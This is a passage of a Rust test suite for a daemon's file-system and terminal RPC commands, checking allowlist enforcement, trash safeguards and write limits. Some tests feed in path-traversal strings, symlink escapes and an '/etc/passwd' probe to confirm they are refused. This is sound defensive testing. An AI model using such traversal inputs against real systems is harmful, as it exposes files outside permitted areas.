                json!({ "scope": "personal", "document": { "version": 1 } }),
            ),
            (
                "keybindings_write",
                json!({ "scope": "personal", "document": { "version": 1 } }),
            ),
            ("actions_trust_status", json!({})),
            ("actions_trust_grant", json!({ "request": {} })),
            ("actions_trust_revoke", json!({})),
        ] {
            let e = err(&r, cmd, args).await;
            assert!(e.contains("--data-dir"), "{cmd}: {e}");
            assert!(e.starts_with(&format!("{cmd}: ")), "{cmd}: {e}");
        }
    }

    #[tokio::test]
    async fn actions_arms_without_a_home_say_so() {
        let d = daemon_with_home(false);
        for cmd in ["actions_read_files", "actions_trust_status"] {
            let e = err(&d.router, cmd, json!({})).await;
            assert!(e.contains("no HOME"), "{cmd}: {e}");
        }
        // The fs arms need no home.
        assert_eq!(
            ok(&d.router, "fs_kind", json!({ "path": s(&d.allowed) })).await,
            "dir"
        );
    }

    // ── fs_list ───────────────────────────────────────────────────

    fn names(v: &Value) -> Vec<String> {
        let mut n: Vec<String> = v
            .as_array()
            .unwrap()
            .iter()
            .map(|e| e["name"].as_str().unwrap().to_string())
            .collect();
        n.sort();
        n
    }

    #[tokio::test]
    async fn fs_list_answers_the_desktop_shape_for_dir_and_for_path() {
        let d = daemon();
        let r = &d.router;
        std::fs::write(d.allowed.join("a.txt"), b"abc").unwrap();
        std::fs::create_dir(d.allowed.join("sub")).unwrap();

        // `dir` is what the desktop command and tauri-cmd.ts use; `path` is what the file
        // picker sent. Both must list the same folder.
        let by_dir = ok(r, "fs_list", json!({ "dir": s(&d.allowed), "glob": null })).await;
        let by_path = ok(r, "fs_list", json!({ "path": s(&d.allowed) })).await;
        assert_eq!(names(&by_dir), ["a.txt", "sub"]);
        assert_eq!(names(&by_dir), names(&by_path));

        let entry = |v: &Value, name: &str| {
            v.as_array()
                .unwrap()
                .iter()
                .find(|e| e["name"] == name)
                .unwrap()
                .clone()
        };
        let file = entry(&by_dir, "a.txt");
        assert_eq!(file["isDir"], false);
        assert_eq!(file["size"], 3);
        assert!(file["modifiedMs"].as_i64().unwrap() > 0);
        assert_eq!(file["path"], s(&d.allowed.join("a.txt")));
        let dir = entry(&by_dir, "sub");
        assert_eq!(dir["isDir"], true);
        // The daemon's original spelling stays, for the file picker.
        assert_eq!(dir["is_dir"], true);
        assert_eq!(file["is_dir"], false);
    }

    #[tokio::test]
    async fn fs_list_never_defaults_to_the_daemons_working_directory() {
        let d = daemon();
        let e = err(&d.router, "fs_list", json!({})).await;
        assert!(e.contains("`dir` is required"), "{e}");
        let e = err(&d.router, "fs_list", json!({ "dir": null })).await;
        assert!(e.contains("`dir` is required"), "{e}");
    }

    #[tokio::test]
    async fn fs_list_refuses_outside_the_allowlist_and_unserved_glob() {
        let d = daemon();
        let r = &d.router;
        std::fs::write(d.outside.join("secret.txt"), b"s").unwrap();
        for dir in [
            s(&d.outside),
            format!("{}/../outside", s(&d.allowed)),
            ".".to_string(),
        ] {
            let e = err(r, "fs_list", json!({ "dir": dir })).await;
            assert!(e.contains("outside allowlist"), "{dir}: {e}");
        }
        // A glob would be silently ignored by a plain read_dir and return everything, so it
        // is refused until it is implemented.
        let e = err(
            r,
            "fs_list",
            json!({ "dir": s(&d.allowed), "glob": "*.rs" }),
        )
        .await;
        assert!(e.contains("glob"), "{e}");
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn fs_list_describes_a_link_out_of_the_allowlist_as_itself() {
        let d = daemon();
        let r = &d.router;
        std::fs::write(d.allowed.join("real.txt"), b"r").unwrap();
        // 40 bytes, so the secret's size and the link's own size cannot be confused.
        std::fs::write(d.outside.join("secret.txt"), vec![b's'; 40]).unwrap();
        std::fs::create_dir(d.outside.join("secret-dir")).unwrap();
        symlink(&d.allowed.join("real.txt"), &d.allowed.join("inside-link"));
        symlink(&d.outside.join("secret-dir"), &d.allowed.join("escape-dir"));
        symlink(
            &d.outside.join("secret.txt"),
            &d.allowed.join("escape-file"),
        );
        symlink(&d.allowed.join("gone"), &d.allowed.join("dangling"));

        let listed = ok(r, "fs_list", json!({ "dir": s(&d.allowed) })).await;
        let get = |name: &str| {
            listed
                .as_array()
                .unwrap()
                .iter()
                .find(|e| e["name"] == name)
                .unwrap_or_else(|| panic!("{name} missing from {listed}"))
                .clone()
        };
        // Inside the allowlist: followed, so it reads like the file it points at.
        assert_eq!(get("inside-link")["size"], 1);
        assert_eq!(get("inside-link")["isDir"], false);
        // Outside: the link itself. Not a directory, and not the target's 40 bytes.
        assert_eq!(get("escape-dir")["isDir"], false);
        assert_ne!(get("escape-file")["size"], 40);
        assert_eq!(get("escape-file")["isDir"], false);
        // A dangling link is still listed, as a link.
        assert_eq!(get("dangling")["isDir"], false);
    }

    #[tokio::test]
    async fn fs_list_shows_a_folder_that_is_not_a_link_as_a_folder() {
        let d = daemon();
        std::fs::create_dir(d.allowed.join("plain")).unwrap();
        let listed = ok(&d.router, "fs_list", json!({ "dir": s(&d.allowed) })).await;
        assert_eq!(listed[0]["isDir"], true);
        assert_eq!(listed[0]["name"], "plain");
    }

    // ── fs_read / fs_write ────────────────────────────────────────

    #[tokio::test]
    async fn fs_read_answers_bytes_and_mime_like_the_desktop() {
        let d = daemon();
        let r = &d.router;
        std::fs::write(d.allowed.join("a.txt"), b"hi").unwrap();
        // Not UTF-8: the original string-returning arm failed on this.
        std::fs::write(d.allowed.join("blob.bin"), [0u8, 255, 1, 128]).unwrap();

        let text = ok(r, "fs_read", json!({ "path": s(&d.allowed.join("a.txt")) })).await;
        assert_eq!(text["bytes"], json!([104, 105]));
        assert_eq!(text["mime"], "text/plain");
        let bin = ok(
            r,
            "fs_read",
            json!({ "path": s(&d.allowed.join("blob.bin")) }),
        )
        .await;
        assert_eq!(bin["bytes"], json!([0, 255, 1, 128]));
        assert_eq!(bin["mime"], "application/octet-stream");

        std::fs::write(d.outside.join("x.txt"), b"x").unwrap();
        let e = err(r, "fs_read", json!({ "path": s(&d.outside.join("x.txt")) })).await;
        assert!(e.contains("outside allowlist"), "{e}");
    }

    #[tokio::test]
    async fn fs_write_takes_bytes_like_the_desktop_and_round_trips() {
        let d = daemon();
        let r = &d.router;
        let deep = s(&d.allowed.join("deep/er/f.bin"));
        ok(r, "fs_write", json!({ "path": deep, "bytes": [0, 255, 1] })).await;
        assert_eq!(
            std::fs::read(d.allowed.join("deep/er/f.bin")).unwrap(),
            [0, 255, 1]
        );
        let back = ok(r, "fs_read", json!({ "path": deep })).await;
        assert_eq!(back["bytes"], json!([0, 255, 1]));

        ok(r, "fs_write", json!({ "path": deep, "bytes": [9] })).await;
        assert_eq!(std::fs::read(d.allowed.join("deep/er/f.bin")).unwrap(), [9]);
    }

    #[tokio::test]
    async fn fs_write_still_takes_content_for_older_callers() {
        let d = daemon();
        let p = s(&d.allowed.join("c.txt"));
        ok(
            &d.router,
            "fs_write",
            json!({ "path": p, "content": "héllo" }),
        )
        .await;
        assert_eq!(
            std::fs::read_to_string(d.allowed.join("c.txt")).unwrap(),
            "héllo"
        );
    }

    /// The original arm read `content` with `unwrap_or_default()`, so the browser's
    /// `{ path, bytes }` call wrote an empty file over the target. A write that names no data
    /// must fail and leave the file alone.
    #[tokio::test]
    async fn fs_write_with_no_data_is_an_error_and_never_truncates() {
        let d = daemon();
        let r = &d.router;
        let keep = d.allowed.join("keep.txt");
        std::fs::write(&keep, b"precious").unwrap();
        let p = s(&keep);

        for args in [
            json!({ "path": p }),
            json!({ "path": p, "bytes": null }),
            json!({ "path": p, "content": null }),
        ] {
            let e = err(r, "fs_write", args).await;
            assert!(e.contains("`bytes` is required"), "{e}");
            assert_eq!(std::fs::read(&keep).unwrap(), b"precious");
        }
        let e = err(
            r,
            "fs_write",
            json!({ "path": p, "bytes": [1], "content": "x" }),
        )
        .await;
        assert!(e.contains("not both"), "{e}");
        assert_eq!(std::fs::read(&keep).unwrap(), b"precious");
    }

    #[tokio::test]
    async fn fs_write_refuses_outside_the_allowlist() {
        let d = daemon();
        let target = d.outside.join("w.txt");
        let e = err(
            &d.router,
            "fs_write",
            json!({ "path": s(&target), "bytes": [1] }),
        )
        .await;
        assert!(e.contains("outside allowlist"), "{e}");
        assert!(!target.exists());
    }

    // ── fs_trash ───────────────────────────────────────────────────

    #[tokio::test]
    async fn fs_trash_refuses_outside_allowlist() {
        let d = daemon();
        let target = d.outside.join("secret.txt");
        std::fs::write(&target, b"keep me safe").unwrap();

        let e = err(&d.router, "fs_trash", json!({ "path": s(&target) })).await;
        assert!(e.contains("outside allowlist"), "{e}");
        assert!(
            target.exists(),
            "target outside allowlist must not be deleted"
        );
    }

    #[tokio::test]
    async fn fs_trash_refuses_dot_dot() {
        let d = daemon();
        let e = err(
            &d.router,
            "fs_trash",
            json!({ "path": format!("{}/../outside/file.txt", s(&d.allowed)) }),
        )
        .await;
        assert!(e.contains("may not contain `..`"), "{e}");
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn fs_trash_refuses_symlink_to_outside() {
        let d = daemon();
        let secret = d.outside.join("secret.txt");
        std::fs::write(&secret, b"sensitive").unwrap();

        let link = d.allowed.join("escape_link");
        std::os::unix::fs::symlink(&secret, &link).unwrap();

        let e = err(&d.router, "fs_trash", json!({ "path": s(&link) })).await;
        assert!(e.contains("outside allowlist"), "{e}");
        assert!(secret.exists(), "file outside allowlist must remain intact");
    }

    #[tokio::test]
    async fn fs_trash_refuses_trash_dir_and_data_dir() {
        let d = daemon();
        let trash_dir = d.data.join("trash");
        std::fs::create_dir_all(&trash_dir).unwrap();

        // 1. Data dir is outside the standard allowlist
        let e = err(&d.router, "fs_trash", json!({ "path": s(&trash_dir) })).await;
        assert!(e.contains("outside allowlist"), "{e}");

        let inside_trash = trash_dir.join("some_file.txt");
        std::fs::write(&inside_trash, b"data").unwrap();
        let e2 = err(&d.router, "fs_trash", json!({ "path": s(&inside_trash) })).await;
        assert!(e2.contains("outside allowlist"), "{e2}");

        // 2. Allowlist covers the root including the data dir (reserved check triggers)
        let tmp = tempfile::tempdir().unwrap();
        let root = tmp.path().canonicalize().unwrap();
        let data = root.join("data");
        let trash = data.join("trash");
        std::fs::create_dir_all(&trash).unwrap();
        let item = trash.join("item.txt");
        std::fs::write(&item, b"x").unwrap();

        let roots_file = root.join("fs_roots.json");
        std::fs::write(
            &roots_file,
            json!({ "roots": [root.to_string_lossy()] }).to_string(),
        )
        .unwrap();
        let roots = crate::fs_roots::FsRoots::load(roots_file).unwrap();
        let guard = PathGuard::roots(Arc::new(roots));
        let db = Arc::new(PaDb::new(data.join("ikenga.db")));
        let router = router_with(
            config(Some(data.clone())),
            Arc::new(PtyManager::new()),
            Arc::new(EngineRegistry::new()),
            Some(db),
            None,
            Some(root.clone()),
            guard,
        );

        let e_trash = err(&router, "fs_trash", json!({ "path": s(&trash) })).await;
        assert!(
            e_trash.contains("reserved")
                || e_trash.contains("inside the daemon's data directory")
                || e_trash.contains("cannot trash the trash directory itself"),
            "{e_trash}"
        );

        let e_item = err(&router, "fs_trash", json!({ "path": s(&item) })).await;
        assert!(
            e_item.contains("reserved")
                || e_item.contains("inside the daemon's data directory")
                || e_item.contains("cannot trash the trash directory itself"),
            "{e_item}"
        );
    }

    #[tokio::test]
    async fn fs_trash_moves_file_and_writes_metadata_sidecar() {
        let d = daemon();
        let file = d.allowed.join("hello.txt");
        std::fs::write(&file, b"content to trash").unwrap();

        ok(&d.router, "fs_trash", json!({ "path": s(&file) })).await;
        assert!(!file.exists(), "original file must be removed");

        let trash_dir = d.data.join("trash");
        assert!(trash_dir.exists(), "trash dir must exist");

        // On Unix, verify mode 0700
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let mode = std::fs::metadata(&trash_dir).unwrap().permissions().mode();
            assert_eq!(mode & 0o777, 0o700, "trash dir must be mode 0700");
        }

        let entries: Vec<_> = std::fs::read_dir(&trash_dir)
            .unwrap()
            .map(|e| e.unwrap().file_name().to_string_lossy().into_owned())
            .collect();

        let item_file = entries
            .iter()
            .find(|n| n.ends_with("_hello.txt"))
            .expect("trashed item exists");
        let sidecar_file = entries
            .iter()
            .find(|n| n.ends_with("_hello.txt.meta.json"))
            .expect("sidecar exists");

        assert_eq!(
            std::fs::read(trash_dir.join(item_file)).unwrap(),
            b"content to trash"
        );

        let meta_str = std::fs::read_to_string(trash_dir.join(sidecar_file)).unwrap();
        let meta: serde_json::Value = serde_json::from_str(&meta_str).unwrap();
        assert_eq!(meta["original_path"], s(&file));
        assert_eq!(meta["file_name"], "hello.txt");
        assert_eq!(meta["is_dir"], false);
        assert!(meta["trashed_at_ms"].as_u64().unwrap() > 0);
    }

    #[tokio::test]
    async fn fs_trash_moves_directory_recursively() {
        let d = daemon();
        let folder = d.allowed.join("my_project");
        let sub = folder.join("sub");
        std::fs::create_dir_all(&sub).unwrap();
        std::fs::write(sub.join("nested.txt"), b"deep nested data").unwrap();

        ok(&d.router, "fs_trash", json!({ "path": s(&folder) })).await;
        assert!(!folder.exists(), "original folder must be removed");

        let trash_dir = d.data.join("trash");
        let entries: Vec<_> = std::fs::read_dir(&trash_dir)
            .unwrap()
            .map(|e| e.unwrap().file_name().to_string_lossy().into_owned())
            .collect();

        let item_dir = entries
            .iter()
            .find(|n| n.ends_with("_my_project"))
            .expect("trashed dir exists");
        let sidecar_file = entries
            .iter()
            .find(|n| n.ends_with("_my_project.meta.json"))
            .expect("sidecar exists");

        assert_eq!(
            std::fs::read(trash_dir.join(item_dir).join("sub/nested.txt")).unwrap(),
            b"deep nested data"
        );

        let meta_str = std::fs::read_to_string(trash_dir.join(sidecar_file)).unwrap();
        let meta: serde_json::Value = serde_json::from_str(&meta_str).unwrap();
        assert_eq!(meta["original_path"], s(&folder));
        assert_eq!(meta["file_name"], "my_project");
        assert_eq!(meta["is_dir"], true);
    }

    #[tokio::test]
    async fn fs_trash_cross_principal_isolation() {
        let d_a = daemon();
        let d_b = daemon();

        let file_a = d_a.allowed.join("doc_a.txt");
        let file_b = d_b.allowed.join("doc_b.txt");
        std::fs::write(&file_a, b"for principal A").unwrap();
        std::fs::write(&file_b, b"for principal B").unwrap();

        ok(&d_a.router, "fs_trash", json!({ "path": s(&file_a) })).await;
        ok(&d_b.router, "fs_trash", json!({ "path": s(&file_b) })).await;

        let trash_a = d_a.data.join("trash");
        let trash_b = d_b.data.join("trash");

        let names_a: Vec<_> = std::fs::read_dir(&trash_a)
            .unwrap()
            .map(|e| e.unwrap().file_name().to_string_lossy().into_owned())
            .collect();
        let names_b: Vec<_> = std::fs::read_dir(&trash_b)
            .unwrap()
            .map(|e| e.unwrap().file_name().to_string_lossy().into_owned())
            .collect();

        assert!(names_a.iter().any(|n| n.contains("doc_a.txt")));
        assert!(
            !names_a.iter().any(|n| n.contains("doc_b.txt")),
            "principal A trash must not contain principal B files"
        );

        assert!(names_b.iter().any(|n| n.contains("doc_b.txt")));
        assert!(
            !names_b.iter().any(|n| n.contains("doc_a.txt")),
            "principal B trash must not contain principal A files"
        );
    }

    /// A daemon with the given allowlist roots, `--data-dir` and home.
    fn daemon_with(roots: &[&Path], data: &Path, home: Option<&Path>) -> Router {
        std::fs::create_dir_all(data).unwrap();
        let roots_file = data.parent().unwrap().join("fs_roots_custom.json");
        let roots_json: Vec<String> = roots.iter().map(|r| s(r)).collect();
        std::fs::write(&roots_file, json!({ "roots": roots_json }).to_string()).unwrap();
        let roots = crate::fs_roots::FsRoots::load(roots_file).unwrap();
        router_with(
            config(Some(data.to_path_buf())),
            Arc::new(PtyManager::new()),
            Arc::new(EngineRegistry::new()),
            Some(Arc::new(PaDb::new(data.join("ikenga.db")))),
            None,
            home.map(Path::to_path_buf),
            PathGuard::roots(Arc::new(roots)),
        )
    }

    fn trash_is_empty(data: &Path) -> bool {
        std::fs::read_dir(data.join("trash")).map_or(true, |mut rd| rd.next().is_none())
    }

    /// Regression: a root counts as inside itself, so the allowlist check
    /// passed and `fs_trash` moved the whole root (under T1, the principal's
    /// home) into the trash. A root, and a folder that holds one, are refused.
    #[tokio::test]
    async fn fs_trash_refuses_an_allowlist_root_and_a_folder_that_holds_one() {
        let d = daemon();
        std::fs::write(d.allowed.join("keep.txt"), b"k").unwrap();
        let e = err(&d.router, "fs_trash", json!({ "path": s(&d.allowed) })).await;
        assert!(e.contains("allowlist root"), "{e}");
        assert!(
            d.allowed.join("keep.txt").exists(),
            "the root must stay put"
        );
        // Spelled with a trailing slash too.
        let e = err(
            &d.router,
            "fs_trash",
            json!({ "path": format!("{}/", s(&d.allowed)) }),
        )
        .await;
        assert!(e.contains("allowlist root"), "{e}");
        assert!(trash_is_empty(&d.data));

        // A root nested under another root, and a folder holding it.
        let tmp = tempfile::tempdir().unwrap();
        let base = tmp.path().canonicalize().unwrap();
        let (r, inner) = (base.join("r"), base.join("r/a/b"));
        std::fs::create_dir_all(&inner).unwrap();
        std::fs::write(inner.join("f.txt"), b"f").unwrap();
        std::fs::write(r.join("plain.txt"), b"p").unwrap();
        let data = base.join("data");
        let router = daemon_with(&[&r, &inner], &data, Some(&base.join("home")));
        for p in [&inner, &r.join("a"), &r] {
            let e = err(&router, "fs_trash", json!({ "path": s(p) })).await;
            assert!(e.contains("allowlist root"), "{}: {e}", p.display());
        }
        assert!(inner.join("f.txt").exists());
        assert!(trash_is_empty(&data));
        // An ordinary file under the roots still trashes.
        ok(
            &router,
            "fs_trash",
            json!({ "path": s(&r.join("plain.txt")) }),
        )
        .await;
        assert!(!r.join("plain.txt").exists());
    }

    /// Regression: with an allowlist that covers the data dir (a supported
    /// setup), trashing an ancestor of the data dir renamed a folder into its
    /// own subtree (EINVAL), fell back to a copy, and the copy recursed into
    /// its own output until ENAMETOOLONG. The ancestor is refused up front.
    #[tokio::test]
    async fn fs_trash_refuses_an_ancestor_of_the_data_dir() {
        let tmp = tempfile::tempdir().unwrap();
        let base = tmp.path().canonicalize().unwrap();
        let root = base.join("R");
        let data = root.join("sub/data");
        std::fs::create_dir_all(&data).unwrap();
        std::fs::write(root.join("sub/sibling.txt"), b"s").unwrap();
        let router = daemon_with(&[&root], &data, None);

        let e = err(&router, "fs_trash", json!({ "path": s(&root.join("sub")) })).await;
        assert!(e.contains("holds the daemon's data directory"), "{e}");
        assert!(root.join("sub/sibling.txt").exists());
        assert!(data.is_dir());
        assert!(trash_is_empty(&data), "no copy may reach the trash");
        // The root itself is refused as a root.
        let e = err(&router, "fs_trash", json!({ "path": s(&root) })).await;
        assert!(e.contains("allowlist root"), "{e}");
        assert!(root.join("sub/sibling.txt").exists());
    }

    /// The daemon's home (under T1 the principal's) is never trashed, nor a
    /// folder that holds it, even when the allowlist root sits above it.
    #[tokio::test]
    async fn fs_trash_refuses_the_home_and_its_ancestors() {
        let tmp = tempfile::tempdir().unwrap();
        let base = tmp.path().canonicalize().unwrap();
        let root = base.join("R");
        let home = root.join("people/ada");
        std::fs::create_dir_all(home.join(".claude")).unwrap();
        let data = base.join("data");
        let router = daemon_with(&[&root], &data, Some(&home));
        for p in [&home, &root.join("people")] {
            let e = err(&router, "fs_trash", json!({ "path": s(p) })).await;
            assert!(e.contains("home directory"), "{}: {e}", p.display());
        }
        assert!(home.join(".claude").exists());
        assert!(trash_is_empty(&data));
    }

    /// plans/file-editing Shape 5: a browser text save over axum's 2 MB body default used to
    /// come back 413. `RPC_BODY_LIMIT` lifts that for `/api/rpc`.
    #[tokio::test]
    async fn fs_write_content_over_axums_2mb_default_succeeds() {
        let d = daemon();
        let p = d.allowed.join("big.txt");
        let text = "abcdefghijklmnopqrstuvwxyz0123456789\n".repeat(3 * 1024 * 1024 / 37 + 1);
        assert!(text.len() > 3 * 1024 * 1024);
        ok(&d.router, "fs_write", json!({ "path": s(&p), "content": text })).await;
        assert_eq!(std::fs::read_to_string(&p).unwrap(), text);
    }

    /// Over the cap the daemon refuses before the arm runs: a 413, and the file on disk is
    /// untouched — a save fails loudly, never truncates.
    #[tokio::test]
    async fn fs_write_over_rpc_body_limit_is_413_and_writes_nothing() {
        let d = daemon();
        let keep = d.allowed.join("keep.txt");
        std::fs::write(&keep, b"precious").unwrap();
        let content = "x".repeat(crate::server::RPC_BODY_LIMIT + 1);
        let body = json!({ "cmd": "fs_write", "args": { "path": s(&keep), "content": content } });
        let res = d
            .router
            .clone()
            .oneshot(
                axum::http::Request::builder()
                    .method("POST")
                    .uri("/api/rpc")
                    .header("authorization", "Bearer tok")
                    .header("content-type", "application/json")
                    .body(Body::from(body.to_string()))
                    .unwrap(),
            )
            .await
            .unwrap();
        assert_eq!(res.status(), StatusCode::PAYLOAD_TOO_LARGE);
        assert_eq!(std::fs::read(&keep).unwrap(), b"precious");
    }

    // ── pty_spawn ──────────────────────────────────────────────────

    /// The browser sends `terminalId` (camelCase, as `tauri-cmd.ts` does); the arm used to read
    /// only `terminal_id`, dropped the name, and recorded an empty one. The daemon always mints
    /// its own pty id; `terminal_id` is the stable name the terminal is listed and found by
    /// (`resolve_id` matches it), which is what lets a browser reattach after a reload.
    #[tokio::test]
    async fn pty_spawn_records_the_terminal_id_in_either_spelling() {
        let d = daemon();
        let r = &d.router;
        let spawn = |key: &str, id: &str| {
            json!({
                key: id,
                "title": "audit",
                "cwd": s(&d.allowed),
                "cmd": ["/bin/sh", "-c", "sleep 30"],
                "rows": 24,
                "cols": 80,
            })
        };
        let camel = ok(r, "pty_spawn", spawn("terminalId", "audit-camel")).await;
        let snake = ok(r, "pty_spawn", spawn("terminal_id", "audit-snake")).await;

        let listed = ok(r, "pty_terminal_list", json!({})).await;
        let names: Vec<String> = listed
            .as_array()
            .unwrap()
            .iter()
            .map(|t| t["terminal_id"].as_str().unwrap().to_string())
            .collect();
        assert!(names.contains(&"audit-camel".to_string()), "{names:?}");
        assert!(names.contains(&"audit-snake".to_string()), "{names:?}");
        // The descriptor ties the name to the pty the spawn returned.
        let by_name = |name: &str| {
            listed
                .as_array()
                .unwrap()
                .iter()
                .find(|t| t["terminal_id"] == name)
                .unwrap()["pty_id"]
                .clone()
        };
        assert_eq!(by_name("audit-camel"), camel["pty_id"]);
        assert_eq!(by_name("audit-snake"), snake["pty_id"]);

        for spawned in [&camel, &snake] {
            ok(r, "pty_kill", json!({ "id": spawned["pty_id"] })).await;
        }
    }

    // ── fs_kind / fs_mime ──────────────────────────────────────────────────

    #[tokio::test]
    async fn fs_kind_answers_the_desktop_kinds_and_missing_for_refusals() {
        let d = daemon();
        let r = &d.router;
        std::fs::write(d.allowed.join("a.txt"), b"a").unwrap();
        std::fs::write(d.outside.join("secret.txt"), b"s").unwrap();

        assert_eq!(
            ok(r, "fs_kind", json!({ "path": s(&d.allowed) })).await,
            "dir"
        );
        let file = s(&d.allowed.join("a.txt"));
        assert_eq!(ok(r, "fs_kind", json!({ "path": file })).await, "file");
        let gone = s(&d.allowed.join("gone.txt"));
        assert_eq!(ok(r, "fs_kind", json!({ "path": gone })).await, "missing");
        // Shape parity with the shared core the desktop command calls.
        let direct = shared_fs::kind(&|p: &str| d.guard.resolve(p), &file).await;
        assert_eq!(ok(r, "fs_kind", json!({ "path": file })).await, direct);

        // Refusals fold into "missing", as on the desktop — nothing leaks.
        for path in [
            s(&d.outside.join("secret.txt")),
            format!("{}/../outside/secret.txt", s(&d.allowed)),
        ] {
            assert_eq!(ok(r, "fs_kind", json!({ "path": path })).await, "missing");
        }
        #[cfg(unix)]
        {
            symlink(&d.outside, &d.allowed.join("escape"));
            let via = s(&d.allowed.join("escape/secret.txt"));
            assert_eq!(ok(r, "fs_kind", json!({ "path": via })).await, "missing");
            let dir = s(&d.allowed.join("escape"));
            assert_eq!(ok(r, "fs_kind", json!({ "path": dir })).await, "missing");
        }
        let e = err(r, "fs_kind", json!({})).await;
        assert!(e.contains("`path` is required"), "{e}");
    }

    /// Gap audit 2026-10-06 rank 17: a refused path answered with an error,
    /// which the markdown path linkifier surfaced as an unhandled rejection.
    /// The desktop folds refusals into `false`; so does this — and it is
    /// `false` for an outside path whether or not that path exists, so the
    /// arm is no existence oracle beyond the allowlist.
    #[tokio::test]
    async fn fs_exists_is_false_not_an_error_for_refusals() {
        let d = daemon();
        let r = &d.router;
        std::fs::write(d.allowed.join("a.txt"), b"a").unwrap();
        std::fs::write(d.outside.join("secret.txt"), b"s").unwrap();

        let file = s(&d.allowed.join("a.txt"));
        assert_eq!(ok(r, "fs_exists", json!({ "path": file })).await, true);
        let gone = s(&d.allowed.join("gone.txt"));
        assert_eq!(ok(r, "fs_exists", json!({ "path": gone })).await, false);
        let deep = s(&d.allowed.join("no/such/chain.txt"));
        assert_eq!(ok(r, "fs_exists", json!({ "path": deep })).await, false);
        // The desktop contract is "a regular file", not "anything".
        assert_eq!(
            ok(r, "fs_exists", json!({ "path": s(&d.allowed) })).await,
            false
        );
        // Shape parity with the shared core.
        let direct = shared_fs::exists(&|p: &str| d.guard.resolve(p), &file).await;
        assert_eq!(ok(r, "fs_exists", json!({ "path": file })).await, direct);

        // Outside the allowlist: an existing and a missing path read the same.
        for path in [
            s(&d.outside.join("secret.txt")),
            s(&d.outside.join("absent.txt")),
            format!("{}/../outside/secret.txt", s(&d.allowed)),
            "/etc/passwd".to_string(),
            "/definitely/not/here".to_string(),
        ] {
            assert_eq!(
                ok(r, "fs_exists", json!({ "path": path })).await,
                false,
                "{path}"
            );
        }
        #[cfg(unix)]
        {
            symlink(&d.outside, &d.allowed.join("escape"));
            let via = s(&d.allowed.join("escape/secret.txt"));
            assert_eq!(ok(r, "fs_exists", json!({ "path": via })).await, false);
        }
        let e = err(r, "fs_exists", json!({})).await;
        assert!(e.contains("`path` is required"), "{e}");
    }

    #[tokio::test]
    async fn fs_mime_needs_an_allowlisted_path_not_an_existing_one() {
        let d = daemon();
        let r = &d.router;
        let md = s(&d.allowed.join("notes.md"));
        let mime = ok(r, "fs_mime", json!({ "path": md })).await;
        let direct = shared_fs::mime(&|p: &str| d.guard.resolve(p), &md).unwrap();
        assert_eq!(mime, json!(direct));
        assert_eq!(mime, "text/markdown");
        assert_eq!(
            ok(r, "fs_mime", json!({ "path": s(&d.allowed.join("x.bin")) })).await,
            "application/octet-stream"
        );

        let e = err(r, "fs_mime", json!({ "path": s(&d.outside.join("a.md")) })).await;
        assert!(e.contains("outside allowlist"), "{e}");
        let dotdot = format!("{}/../outside/a.md", s(&d.allowed));
        let e = err(r, "fs_mime", json!({ "path": dotdot })).await;
        assert!(e.contains("outside allowlist"), "{e}");
        #[cfg(unix)]
        {
            symlink(&d.outside, &d.allowed.join("escape"));
            let via = s(&d.allowed.join("escape/a.md"));
            let e = err(r, "fs_mime", json!({ "path": via })).await;
            assert!(e.contains("outside allowlist"), "{e}");
        }
    }

    // ── fs_search ──────────────────────────────────────────────────────────

    #[tokio::test]
    async fn fs_search_stays_inside_the_allowlisted_root() {
        let d = daemon();
        let r = &d.router;
        let a = &d.allowed;
        std::fs::create_dir_all(a.join("sub/deeper")).unwrap();
        std::fs::create_dir_all(a.join("node_modules")).unwrap();
        std::fs::write(a.join("report.md"), b"").unwrap();
        std::fs::write(a.join("sub/deeper/Report-2.md"), b"").unwrap();
        std::fs::write(a.join(".report-hidden"), b"").unwrap();
        std::fs::write(a.join("node_modules/report.js"), b"").unwrap();
        std::fs::write(d.outside.join("report-secret.md"), b"").unwrap();
        #[cfg(unix)]
        symlink(&d.outside, &a.join("linked"));

        let camel = ok(
            r,
            "fs_search",
            json!({ "root": s(a), "query": "REPORT", "showHidden": false, "showIgnored": false }),
        )
        .await;
        let snake = ok(
            r,
            "fs_search",
            json!({ "root": s(a), "query": "REPORT", "show_hidden": false, "show_ignored": false, "limit": null }),
        )
        .await;
        assert_eq!(camel, snake);
        let direct = shared_fs::search(
            &|p: &str| d.guard.resolve(p),
            &s(a),
            "REPORT",
            false,
            false,
            None,
        )
        .await
        .unwrap();
        assert_eq!(camel, serde_json::to_value(&direct).unwrap());
        let mut hits: Vec<String> = serde_json::from_value(camel["matches"].clone()).unwrap();
        hits.sort();
        assert_eq!(
            hits,
            vec![
                s(&a.join("report.md")),
                s(&a.join("sub/deeper/Report-2.md"))
            ]
        );
        assert_eq!(camel["truncated"], false);
        // The symlinked directory is not descended: nothing from outside.
        assert!(!hits.iter().any(|h| h.contains("secret")));

        let all = ok(
            r,
            "fs_search",
            json!({ "root": s(a), "query": "report", "showHidden": true, "showIgnored": true }),
        )
        .await;
        assert_eq!(all["matches"].as_array().unwrap().len(), 4);
        // The desktop's cap: `limit` stops the walk early.
        let capped = ok(
            r,
            "fs_search",
            json!({ "root": s(a), "query": "report", "showHidden": true, "showIgnored": true, "limit": 1 }),
        )
        .await;
        assert_eq!(capped["matches"].as_array().unwrap().len(), 1);
        assert_eq!(capped["truncated"], true);

        for root in [s(&d.outside), format!("{}/../outside", s(a))] {
            let e = err(
                r,
                "fs_search",
                json!({ "root": root, "query": "report", "showHidden": true, "showIgnored": true }),
            )
            .await;
            assert!(e.contains("outside allowlist"), "{e}");
        }
        #[cfg(unix)]
        {
            let e = err(
                r,
                "fs_search",
                json!({ "root": s(&a.join("linked")), "query": "report", "showHidden": true, "showIgnored": true }),
            )
            .await;
            assert!(e.contains("outside allowlist"), "{e}");
        }
        let e = err(r, "fs_search", json!({ "root": s(a), "query": "x" })).await;
        assert!(e.contains("`showHidden` is required"), "{e}");
    }

    // ── fs_rename ──────────────────────────────────────────────────────────

    #[tokio::test]
    async fn fs_rename_keeps_both_ends_inside_the_allowlist() {
        let d = daemon();
        let r = &d.router;
        let a = &d.allowed;
        std::fs::write(a.join("one.txt"), b"1").unwrap();

        let dest = ok(
            r,
            "fs_rename",
            json!({ "from": s(&a.join("one.txt")), "toName": "two.txt" }),
        )
        .await;
        assert_eq!(dest, s(&a.join("two.txt")));
        assert!(!a.join("one.txt").exists());
        let dest = ok(
            r,
            "fs_rename",
